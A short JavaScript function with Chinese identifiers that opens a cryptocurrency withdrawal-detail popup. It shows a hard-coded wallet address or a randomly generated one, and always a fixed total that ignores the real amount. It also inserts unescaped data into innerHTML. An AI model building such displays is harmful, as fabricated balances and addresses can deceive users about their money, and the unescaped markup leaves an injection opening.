// 顯示彈窗明細
function 顯示彈窗(元素) {
    const 幣種 = 元素.dataset.coin;
    const 金額 = 元素.dataset.amount;
    const 時間 = 元素.dataset.time;
    const 狀態 = 元素.dataset.status;
    const 索引 = 元素.dataset.index;

    const 固定地址 = "TVJmnLKY1hgGL2ctXYhQysbw1nrP5i7uP";
    const 錢包地址 = 索引 === "0" ? 固定地址 : 隨機地址("T", 34);

    const 彈窗明細區 = document.getElementById("彈窗明細");
    彈窗明細區.innerHTML = `
    <div class="彈窗列 幣種顯示區塊">
      <img src="${幣種}.png" alt="${幣種}" class="幣種圖示" />
      <span class="幣種標籤">${幣種}</span>
    </div>
    <div class="交易總計">
      <span class="幣種標籤">總計</span>
      <span class="幣種標籤">8650.837383</span>
    </div>
  `;

    // 顯示彈窗區塊與遮罩
    document.getElementById("提領彈窗").style.display = "block";
    document.getElementById("遮罩背景").style.display = "block";

    // 關閉彈窗
    document.getElementById("關閉彈窗").addEventListener("click", () => {
        document.getElementById("提領彈窗").style.display = "none";
        document.getElementById("遮罩背景").style.display = "none";
    });
}
